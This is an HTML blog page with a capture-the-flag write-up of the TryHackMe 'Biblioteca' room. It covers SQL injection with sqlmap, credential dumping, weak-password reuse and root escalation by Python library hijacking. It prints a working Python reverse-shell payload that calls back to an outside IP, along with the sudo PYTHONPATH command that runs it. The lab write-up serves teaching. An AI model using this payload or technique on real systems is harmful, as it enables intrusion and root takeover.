@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="https://tryhackme.com/room/biblioteca
+User Flag First, we start by enumerating the ports and services.
+In the print below I have already set the ports to 22 and 8000 because I found out that they were open in a regular scan without any nmap flags.
+
+I access the website and see that there is a login page. I try to create a user in the Sign-Up link to see what it looks like in there, but there is nothing interesting there." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://b1d0ws.github.io/write-ups/biblioteca-thm/" />
+
+
+    <title>
+        
+            Biblioteca - TryHackMe :: b1d0ws 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Biblioteca - TryHackMe">
+<meta itemprop="description" content="https://tryhackme.com/room/biblioteca
+User Flag First, we start by enumerating the ports and services.
+In the print below I have already set the ports to 22 and 8000 because I found out that they were open in a regular scan without any nmap flags.
+
+I access the website and see that there is a login page. I try to create a user in the Sign-Up link to see what it looks like in there, but there is nothing interesting there.">
+<meta itemprop="datePublished" content="2022-05-23T20:20:50-03:00" />
+<meta itemprop="dateModified" content="2022-05-23T20:20:50-03:00" />
+<meta itemprop="wordCount" content="494">
+<meta itemprop="image" content="https://b1d0ws.github.io/"/>
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://b1d0ws.github.io/"/>
+
+<meta name="twitter:title" content="Biblioteca - TryHackMe"/>
+<meta name="twitter:description" content="https://tryhackme.com/room/biblioteca
+User Flag First, we start by enumerating the ports and services.
+In the print below I have already set the ports to 22 and 8000 because I found out that they were open in a regular scan without any nmap flags.
+
+I access the website and see that there is a login page. I try to create a user in the Sign-Up link to see what it looks like in there, but there is nothing interesting there."/>
+
+
+
+
+    <meta property="og:title" content="Biblioteca - TryHackMe" />
+<meta property="og:description" content="https://tryhackme.com/room/biblioteca
+User Flag First, we start by enumerating the ports and services.
+In the print below I have already set the ports to 22 and 8000 because I found out that they were open in a regular scan without any nmap flags.
+
+I access the website and see that there is a login page. I try to create a user in the Sign-Up link to see what it looks like in there, but there is nothing interesting there." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://b1d0ws.github.io/write-ups/biblioteca-thm/" />
+<meta property="og:image" content="https://b1d0ws.github.io/"/>
+<meta property="article:published_time" content="2022-05-23T20:20:50-03:00" />
+<meta property="article:modified_time" content="2022-05-23T20:20:50-03:00" /><meta property="og:site_name" content="b1d0ws" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2022-05-23 20:20:50 -0300 -03" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark"> </span>
+            <span class="logo__text">/home/b1d0ws</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/certifications/">certifications</a></li><li><a href="/posts/">posts</a></li><li><a href="/write-ups/">write-ups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://b1d0ws.github.io/write-ups/biblioteca-thm/">Biblioteca - TryHackMe</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <p><a href="https://tryhackme.com/room/biblioteca">https://tryhackme.com/room/biblioteca</a></p>
+<p><img src="/biblioteca/wallpaper.jpg" alt="biblioteca"></p>
+<h2 id="user-flag"><strong>User Flag</strong></h2>
+<p>First, we start by enumerating the ports and services.<br>
+In the print below I have already set the ports to 22 and 8000 because I found out that they were open in a regular scan without any nmap flags.</p>
+<p><img src="/biblioteca/PortScan.png" alt="biblioteca"></p>
+<p><br>
+I access the website and see that there is a login page. I try to create a user in the Sign-Up link to see what it looks like in there, but there is nothing interesting there.</p>
+<p><img src="/biblioteca/Port8000.png" alt="biblioteca"></p>
+<p><img src="/biblioteca/UserLoggedIn.png" alt="biblioteca"></p>
+<p><br>
+Since the first page is a login page, I quickly try some SQL Injection with sqlmap, first by intercepting the POST request and then using it with the sqlmap command.</p>
+<p><img src="/biblioteca/RequestIntercepted.png" alt="biblioteca"></p>
+<p><img src="/biblioteca/sqlmap.png" alt="biblioteca"></p>
+<p><br>
+We can observe that the parameter username is vulnerable so I start to retrieve informations from the database. You can see in the image above that the Database is called website.</p>
+<p>As this is a TryHackMe host probably the database is small, so to gain some time I use the flag –dump-all to dump everything from the website database.</p>
+<p><img src="/biblioteca/DumpandoInfos.png" alt="biblioteca"></p>
+<p><br>
+Here I got a username and password and immediately try these credentials in SSH.</p>
+<p><img src="/biblioteca/ssh-login.png" alt="biblioteca"></p>
+<p><br>
+Trying to find the flag, we see that it is in the hazel home and we don’t have permissions to read it. So, we need to find some way to login as hazel.</p>
+<p><img src="/biblioteca/PermissaoNegada.png" alt="biblioteca"></p>
+<p><br>
+In this part I got stuck for a few minutes and I need to look at the hint. The hint was “Weak password”, so I just tried a simple password combination and “hazel”, same as the username, worked it.</p>
+<p>Now logged as hazel, we just need to <em>cat</em> the user.txt and get the first flag.</p>
+<p><img src="/biblioteca/flag-user.png" alt="biblioteca"></p>
+<h2 id="root-flag"><strong>Root Flag</strong></h2>
+<p>The first thing I do when I need to privilege escalation is to check the permissions with sudo and if there is something interesting in this user.</p>
+<p><img src="/biblioteca/sudo-l.png" alt="biblioteca"></p>
+<p><br>
+We see that hazel can use the command python3 with root permissions in the file <em>hasher.py</em>.</p>
+<p>Taking a look at this file, we see that there is a library being used: <em>hashlib</em>.</p>
+<p><img src="/biblioteca/hasherPython.png" alt="biblioteca"></p>
+<p><br>
+Here we can do something that is called Python Library Hijacking. Basically, we just need to modify the library file and insert some malicious payload to get this payload executed by root.</p>
+<p>This <a href="https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/">article</a> explains this exploration in a very clear way.</p>
+<p>Since we don’t have permission to edit the current library file, we copied it to the /tmp directory.</p>
+<p><img src="/biblioteca/libtmp.png" alt="biblioteca"></p>
+<p><br>
+Now we can edit it and insert a python reverse shell payload with our tun0 address.</p>
+<pre><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.2.117.185&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
+</code></pre><p><img src="/biblioteca/payloadLib.png" alt="biblioteca"></p>
+<p><br>
+We need to execute the python file with the PYTHONPATH argument, to tell where python will search for the libraries included in the hasher.py. When we execute the hasher.py, it will call the library hashlib and since there is this playload in the library file, the reverse shell will be popped in our listener.</p>
+<p>Remember to set your listener before executing the command.</p>
+<pre><code>sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
+</code></pre><p><img src="/biblioteca/comando.png" alt="biblioteca"></p>
+<p><br>
+Finally we obtain our reverse shell and just cat root.txt for the second flag.</p>
+<p><img src="/biblioteca/flag-root.png" alt="biblioteca"></p>
+<p>See ya =).</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>
+
+
+
+    </body>
+</html>
